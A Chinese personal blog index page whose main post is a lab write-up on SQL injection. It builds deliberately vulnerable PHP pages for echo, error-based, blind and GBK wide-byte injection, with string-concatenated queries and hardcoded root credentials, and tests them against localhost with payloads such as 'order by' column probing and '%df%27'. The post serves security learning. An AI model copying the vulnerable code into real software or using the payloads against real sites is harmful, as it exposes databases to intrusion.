<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">
<meta property="og:type" content="website">
<meta property="og:title" content="Darren-学无止境">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Darren-学无止境">
<meta property="og:description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Darren-学无止境">
<meta name="twitter:description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/">





  <title>Darren-学无止境</title>
  









  <script>
class Circle {
    //创建对象
    //以一个圆为对象
    //设置随机的 x，y坐标，r半径，_mx，_my移动的距离
    //this.r是创建圆的半径，参数越大半径越大
    //this._mx,this._my是移动的距离，参数越大移动
    constructor(x, y) {
        this.x = x;
        this.y = y;
        this.r = Math.random() * 10 ;
        this._mx = Math.random() ;
        this._my = Math.random() ;

    }

    //canvas 画圆和画直线
    //画圆就是正常的用canvas画一个圆
    //画直线是两个圆连线，为了避免直线过多，给圆圈距离设置了一个值，距离很远的圆圈，就不做连线处理
    drawCircle(ctx) {
        ctx.beginPath();
        //arc() 方法使用一个中心点和半径，为一个画布的当前子路径添加一条弧。
        ctx.arc(this.x, this.y, this.r, 0, 360)
        ctx.closePath();
        ctx.fillStyle = 'rgba(204, 204, 204, 0.3)';
        ctx.fill();
    }

    drawLine(ctx, _circle) {
        let dx = this.x - _circle.x;
        let dy = this.y - _circle.y;
        let d = Math.sqrt(dx * dx + dy * dy)
        if (d < 150) {
            ctx.beginPath();
            //开始一条路径，移动到位置 this.x,this.y。创建到达位置 _circle.x,_circle.y 的一条线：
            ctx.moveTo(this.x, this.y);   //起始点
            ctx.lineTo(_circle.x, _circle.y);   //终点
            ctx.closePath();
            ctx.strokeStyle = 'rgba(204, 204, 204, 0.3)';
            ctx.stroke();
        }
    }

    // 圆圈移动
    // 圆圈移动的距离必须在屏幕范围内
    move(w, h) {
        this._mx = (this.x < w && this.x > 0) ? this._mx : (-this._mx);
        this._my = (this.y < h && this.y > 0) ? this._my : (-this._my);
        this.x += this._mx / 2;
        this.y += this._my / 2;
    }
}
//鼠标点画圆闪烁变动
class currentCirle extends Circle {
    constructor(x, y) {
        super(x, y)
    }

    drawCircle(ctx) {
        ctx.beginPath();
        //注释内容为鼠标焦点的地方圆圈半径变化
        //this.r = (this.r < 14 && this.r > 1) ? this.r + (Math.random() * 2 - 1) : 2;
        this.r = 8;
        ctx.arc(this.x, this.y, this.r, 0, 360);
        ctx.closePath();
        //ctx.fillStyle = 'rgba(0,0,0,' + (parseInt(Math.random() * 100) / 100) + ')'
        ctx.fillStyle = 'rgba(255, 77, 54, 0.3)'
        ctx.fill();

    }
}
//更新页面用requestAnimationFrame替代setTimeout
window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;

let canvas = document.getElementById('canvas');
let ctx = canvas.getContext('2d');
let w = canvas.width = canvas.offsetWidth;
let h = canvas.height = canvas.offsetHeight;
let circles = [];
let current_circle = new currentCirle(0, 0)

let draw = function () {
    ctx.clearRect(0, 0, w, h);
    for (let i = 0; i < circles.length; i++) {
        circles[i].move(w, h);
        circles[i].drawCircle(ctx);
        for (j = i + 1; j < circles.length; j++) {
            circles[i].drawLine(ctx, circles[j])
        }
    }
    if (current_circle.x) {
        current_circle.drawCircle(ctx);
        for (var k = 1; k < circles.length; k++) {
            current_circle.drawLine(ctx, circles[k])
        }
    }
    requestAnimationFrame(draw)
}

let init = function (num) {
    for (var i = 0; i < num; i++) {
        circles.push(new Circle(Math.random() * w, Math.random() * h));
    }
    draw();
}
window.addEventListener('load', init(60));
window.onmousemove = function (e) {
    e = e || window.event;
    current_circle.x = e.clientX;
    current_circle.y = e.clientY;
}
window.onmouseout = function () {
    current_circle.x = null;
    current_circle.y = null;

};
</script>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
<a href="https://github.com/Darren-zl"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Darren-学无止境</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-message">
          <a href="/message/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
            
            留言板
          </a>
        </li>
      
        
        <li class="menu-item menu-item-photo">
          <a href="/photo/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
            
            摄影
          </a>
        </li>
      
        
        <li class="menu-item menu-item-music">
          <a href="/music/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-music"></i> <br>
            
            音乐
          </a>
        </li>
      
        
        <li class="menu-item menu-item-welfare">
          <a href="/welfare/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-leaf"></i> <br>
            
            福利
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            书单
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/各种注入类型的环境搭建和代码编写/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/06/各种注入类型的环境搭建和代码编写/" itemprop="url">各种注入类型的环境搭建和代码编写</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-06T13:55:34+08:00">
                2019-10-06
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/10/06/各种注入类型的环境搭建和代码编写/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/10/06/各种注入类型的环境搭建和代码编写/" class="cy_cmt_count" data-xid="2019/10/06/各种注入类型的环境搭建和代码编写/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/10/06/各种注入类型的环境搭建和代码编写/" class="leancloud_visitors" data-flag-title="各种注入类型的环境搭建和代码编写">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="第十周-各种注入类型的环境搭建和代码编写"><a href="#第十周-各种注入类型的环境搭建和代码编写" class="headerlink" title="第十周-各种注入类型的环境搭建和代码编写"></a>第十周-各种注入类型的环境搭建和代码编写</h2><p><strong>环境：mysql5.7.26+Apache2.4.39+php5.2</strong></p>
<h4 id="1-回显注入"><a href="#1-回显注入" class="headerlink" title="1.回显注入"></a>1.回显注入</h4><p>回显注入是sql相关的查询信息，错误信息均能回显到页面中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"><span class="comment">//这里id没有做整形转换</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//sql语句没有单引号保护,造成注入</span></span><br><span class="line"><span class="keyword">echo</span> $sql = <span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189144065.png" alt="1570189144065"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189270984.png" alt="1570189270984"></p>
<h4 id="2-错误注入"><a href="#2-错误注入" class="headerlink" title="2.错误注入"></a>2.错误注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"><span class="comment">//这里id没有做整形转换</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//sql语句没有单引号保护,造成注入</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://127.0.0.1/xinan1.php?id=1页面正常" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1页面正常</a></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189720646.png" alt="1570189720646"></p>
<p>构造访问<a href="http://127.0.0.1/xinan1.php?id=\" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=\</a> 页面爆出错误意味有报错注入。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189794321.png" alt="1570189794321"></p>
<p>也可以这么构造<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and multipoint (()select * from(select user() )1)2 );</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570193965146.png" alt="1570193965146"></p>
<p>构造访问<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and 1=2 order by 6页面正常，访问<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and 1=2 order by 7页面错误。意味有6个字段。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570190563493.png" alt="1570190563493"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570190655815.png" alt="1570190655815"></p>
<p>用sqlmap进行跑一下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570195521565.png" alt="1570195521565"></p>
<h4 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h4><p>盲注不向上面两种，当发现有SQL注入时候，不能得到SQL查询数据的返显。盲注通过服务器返回的状态等各种因素来猜测。</p>
<p>SQL盲注中常用的几个内置函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(str)：返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line">ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">asc();返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)    <span class="comment">//如果查到数据就执行如下</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'数据查询成功'</span>;    </span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span>     <span class="comment">//否则执行这个     从两者返回的网页结构不一样，就可以作为我们盲注条件判断的依据</span></span><br><span class="line">    &#123;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">'数据查询失败'</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>正常页面：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570197354995.png" alt="1570197354995"></p>
<p>错误页面：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570197383661.png" alt="1570197383661"></p>
<h4 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h4><p>​        宽字节注入源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
<p>​        如果存在宽字节注入，我们输入%df%27时，经过转译变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（具体见GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570203659620.png" alt="1570203659620"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>); <span class="comment">//将页面设置为utf-8</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"yuangong"</span>, $conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GBK"</span>, $conn);	<span class="comment">//不安全的编码方式</span></span><br><span class="line"> </span><br><span class="line">$id = addslashes($_GET[<span class="string">'id'</span>]);			<span class="comment">//不安全的转义函数</span></span><br><span class="line">$sql = <span class="string">"select * from workers where id='$id'"</span>;</span><br><span class="line">$query = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>($query == <span class="keyword">True</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$result = mysql_fetch_array($query);</span><br><span class="line">		$username = $result[<span class="string">"username"</span>];</span><br><span class="line">		$email = $result[<span class="string">"email"</span>];</span><br><span class="line"> </span><br><span class="line">		print_r(<span class="string">'用户名： '</span> . $username . <span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">		print_r(<span class="string">'邮  箱： '</span> . $email . <span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">		$sql = mb_convert_encoding($sql, <span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>);</span><br><span class="line">		print_r(<span class="string">'&lt;br /&gt;SQL语句：'</span> . $sql);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>构建URL:<a href="http://127.0.0.1/xinan1.php?id=1%df%27" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1%df%27</a> and 1=1 %23</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570204003665.png" alt="1570204003665"></p>
<h5 id="参考链接：https-www-jianshu-com-p-e3c5233a3c42"><a href="#参考链接：https-www-jianshu-com-p-e3c5233a3c42" class="headerlink" title="参考链接：https://www.jianshu.com/p/e3c5233a3c42"></a>参考链接：<a href="https://www.jianshu.com/p/e3c5233a3c42" target="_blank" rel="noopener">https://www.jianshu.com/p/e3c5233a3c42</a></h5>
          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/30/web页面解析流程学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/30/web页面解析流程学习/" itemprop="url">web页面解析流程学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-30T10:55:34+08:00">
                2019-09-30
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
